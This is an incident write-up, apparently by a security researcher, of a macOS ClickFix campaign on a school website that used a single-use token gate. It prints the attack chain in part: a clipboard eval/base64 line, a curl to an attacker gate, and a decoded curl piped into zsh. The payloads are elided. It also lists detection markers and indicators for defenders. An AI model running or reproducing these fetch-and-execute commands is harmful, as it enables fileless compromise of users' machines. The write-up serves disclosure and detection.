# One Shot: a ClickFix Chain That Cannot Be Analysed Twice

## What a single-use gate does to incident response — and why the page source could not tell this case apart from a legitimate one

*First documentation, August 2026*

---

## TL;DR

A German primary school's website served a fake Cloudflare "human verification" overlay
instructing visitors to press `⌘+Space → Terminal → ⌘+V → Enter`. On page load,
JavaScript had already written a command into the clipboard. Pasting it fetches a second
stage and pipes it straight into `zsh` — nothing touches disk, and the victim executes it
under their own account, so Gatekeeper, XProtect and download filters never get a vote.

The interesting part is not the technique, which is well documented. It is the **gate**:
the first stage checks in with a control server using a per-victim token, and that token
is honoured **exactly once**. Analyse it a second time and you get nothing. That single
design choice reorders the whole investigation — and it defeated an attempt to collect a
fresh sample roughly 70 minutes after a public report.

This note is the operational companion to [the Ad-Shield case](../2026-08-ad-shield-welt-de/),
which reached the opposite conclusion from evidence that looked much the same. Read
together, they are the actual argument.

---

## 1. The chain

**Stage 0 — the clipboard.** 477 bytes, written on page load:

```sh
_7dcf=<hex>;eval "$(printf '%s' '<base64>'|base64 -d)"
```

**Stage 1 — after one decode:**

```sh
_xr=$(curl -s 'hxxp://enter-pverif-code[.]info/p/<per-victim-token>')
if [ "$_xr" = "ok" ]; then
    curl -s $(echo "<base64>" | openssl base64 -d -A) | zsh
fi
```

**Stage 2 — from the inner layer:**

```
hxxps://ferncurrent14[.]com/curl/<campaign-token>
```

Three details worth keeping:

- Stage 1 runs over **plain HTTP**; stage 2 is HTTPS. The gate check is readable on the
  wire, which is a gift to network detection and a curious choice by the operator.
- The inner layer uses `openssl base64 -d -A`, not `base64 -d`. Same result, different
  string — enough to slip a naive clipboard or shell-history signature keyed on the
  obvious form.
- Throwaway variable prefixes (`_7dcf`, `_xr`) change per campaign but are stable within
  one, which makes them decent hunting material and poor blocking material.

---

## 2. The gate, and what it costs you

The control server answers `ok` once per token. A second request returns nothing, and the
`if` never fires.

For the operator this buys clean per-click telemetry and defeats sandbox re-execution. For
anyone investigating, it means:

- **Stage 2 cannot be retrieved retrospectively.** By the time the clipboard content is in
  front of you, the token may already be spent — by the victim, or by your own first look.
- **The payload is unfalsifiable after the fact.** We can describe stage 2's *address*
  precisely. We cannot say what it did, because we never held it (see section 5).
- **Re-analysis is not a fallback.** In ordinary web-malware work you can usually go back
  and fetch the artefact again. Here the first contact is the only contact.

The practical consequence is an inversion of the usual order. Normally: observe, form a
hypothesis, then collect what the hypothesis needs. Against a single-use gate: **collect
first, at full fidelity, then think.** Preserve the clipboard content byte-for-byte before
decoding it, before pasting it anywhere, before deciding what it is.

That sounds obvious written down. It is not what happens when a page looks broken and the
first instinct is to poke at it.

---

## 3. The window, measured

On 2026-08-04 a public feed carried a batch of 29 apex domains tagged as ClickFix,
submitted at 16:56:50 UTC. One of them was `ferncurrent14[.]com` — the same stage-2 host
seen in this case, which is what tied the batch to it.

Eight of those targets were fetched shortly after 18:08 UTC, download-only. Roughly
**70 minutes** after the public report:

| Target type | Result |
|---|---|
| Attacker-registered hosts (3) | 404 behind Cloudflare, 521 and 522 — origins gone |
| A lure path seen an hour earlier | 404 |
| Compromised legitimate sites (4) | clean original pages, no injection served |

A YARA rule written against the lure page matched **nothing**. A referer bypass with a
macOS Safari user agent changed nothing.

The decisive observation was passive rather than active: the public scanning service's own
screenshots of the same domains, taken at submission time, show the **same clean pages**
and `403 Forbidden` for the attacker-owned hosts. The scanner had been gated out exactly as
we were. An archived DOM would not have helped either — there was nothing in the archive to
begin with.

So the gating is stronger than user-agent or referer filtering. One-shot-per-IP, geo
filtering, or a required redirect chain from malvertising all fit what we saw. Whatever the
mechanism, the operational figure is the one that matters: **for this campaign, a lure is
retrievable inside a window well under an hour — if at all, from a research address.**

---

## 4. The cluster

The 29-domain batch separates cleanly by domain age, and the split matches the roles:

- **Eight domains registered within six days** — the moving parts. Gating hosts, loader
  hosts, throwaway names. Two of them, `enter-pverif-code[.]info` (this case's gate) and
  `makeverizyjar[.]info`, were both zero days old and answered with responses of
  *identical length*. Same role, same age, same size — and, as section 6 shows, the same autonomous system.
  That last point is what lifted it from guess to assessment.
- **Twenty-one established sites**, ages roughly one to ten years, mostly WordPress. These
  are the delivery surface — other people's compromised websites.

One of them, `v-k[.]com[.]ua`, carried a path named `vcapcha.ps1`. A PowerShell file named
after a fake captcha is the Windows arm of the same technique, from the same cluster. Until
then a Windows variant had been "likely but unobserved"; that question is now settled.

**The twenty-one are victims, not infrastructure.** They appear here for context and are
deliberately kept out of the indicator files. Blocking them punishes their users and
creates a delisting problem for people who did nothing wrong. The distinction between
"appears in a campaign" and "belongs to the campaign" is the whole job.

---

## 5. What this note does not establish

- **The payload.** Stage 2 was never retrieved. Classifying it as an infostealer of a
  particular family would be an inference from the shape of the chain, not a finding. We
  do not make it.
- **Attribution.** Nothing here identifies who is behind this. A domain's country code is
  not a location, a location is not a nationality, and rented infrastructure is not
  ownership. The edge-node identifiers in server responses describe the *requester's*
  nearest point of presence, not the target's.

  This applies with full force to the hosting data in section 6. Both gate domains resolve
  to origin IPs in a single autonomous system, and that system carries a Seychelles
  registration while its netblocks carry a Turkish one. Those are registry entries. They
  do not place a server anywhere, and they say nothing at all about who runs the campaign.
  The value of the finding is that a named provider exists to serve legal process on — not
  that a flag can be attached to it.
- **Scale.** How many people saw the overlay, and how many followed it, is answerable only
  from the affected site's server logs. Those sit with the site operator.

---

## 6. Indicators

Full, machine-readable, CC0: [`evidence/iocs.txt`](evidence/iocs.txt).

```
enter-pverif-code.info      stage-1 gate / click telemetry (plain HTTP)
makeverizyjar.info          sibling gate, same hosting AS
ferncurrent14.com           stage-2 loader host
```

**The gates are not behind the proxy.** Re-checked on 2026-08-06 against two independent
resolvers: both gate domains use Cloudflare nameservers but DNS-only `A` records, leaving
their origins exposed. Only the stage-2 host is actually proxied.

```
178.16.52.101   enter-pverif-code.info   AS202412
158.94.208.87   makeverizyjar.info       AS202412
188.114.96.3    ferncurrent14.com        AS13335 (Cloudflare) — proxied
```

`AS202412` is *OMEGATECH-AS, Omegatech LTD*, an autonomous system registered 2026-01-12.

That matters twice over. It lifts `makeverizyjar.info` above a coincidence of response
length and registration age — it now shares hosting infrastructure with the confirmed
gate, which is materially stronger, though an AS also hosts unrelated customers. And it
leaves something an investigator can act on: an unproxied origin identifies a provider who
can be served a subscriber-data request, which a Cloudflare-fronted domain does not.

On what this is *not*, see section 5.

**Behavioural markers** — more durable than the domains, which rotate within days:

```
eval "$(printf '%s' '<b64>'|base64 -d)"     outer layer
openssl base64 -d -A                        second decode layer
curl -s … | zsh                             fileless execution
_7dcf / _xr                                 throwaway variable prefixes
```

Detection rules, the decoded chain, the full 29-domain cluster analysis and the capture
tooling live in a separate repository:
**[macos-threat-tracking](https://github.com/raimurokko/macos-threat-tracking)**. The
clipboard sample there carries MD5 `2169ff5e7be77fc3ff72758f9fa50658`, which is the
reference hash registered with two published YARA rules — so the rules can be verified
against the artefact they were written from.

---

## 7. The lesson, and its twin

The methodological point of this note is section 2: **against single-use infrastructure,
collection precedes analysis.** There is no second look, so fidelity at first contact is
the only thing that survives.

But the more uncomfortable point only appears when this case is placed next to the
[Ad-Shield note](../2026-08-ad-shield-welt-de/) in this repository.

There, a major news site served an obfuscated script injected into its HTML, with
attributes set to evade optimisers, contacting a domain that filter lists classify as
adware. Every surface indicator said *compromise*. It was a paid feature, deliberately
integrated by the publisher.

Here, a school website served an obfuscated script injected into its HTML, with markers
and evasion characteristics of the same general shape. Every surface indicator said
*compromise*. This time it was one.

The page source could not tell the two apart. In the first case the answer came from
domain reputation; in the second, from the behaviour of the infrastructure — the gate, the
token, the rotation. In neither case did it come from reading the code more carefully.

Which is worth stating plainly, because the instinct runs the other way: **when injected
third-party code turns up in a page you did not expect it in, more code analysis is rarely
what resolves it.** What resolves it is establishing who the sender is and how their
infrastructure behaves.

---

## 8. Handling

The affected school was notified the same day, unpaid and without commercial interest, with
remediation steps and a suggested notice for parents. **The site is deliberately not named
here**, and no screenshot of it is published: it is a victim, the operator was given the
information first, and identifying it would serve no defender.

Attacker-controlled indicators are published in full, TLP:CLEAR, because that is what makes
them useful. The two categories are kept apart on purpose — a campaign write-up that names
its victims to look thorough has confused documentation with exposure.

---

*This note documents observations from 2026-08-04 and the days following. The analysis of
the clipboard content was static; nothing was executed. Infrastructure of this kind changes
within days, and several indicators here were already dead when this was written.*
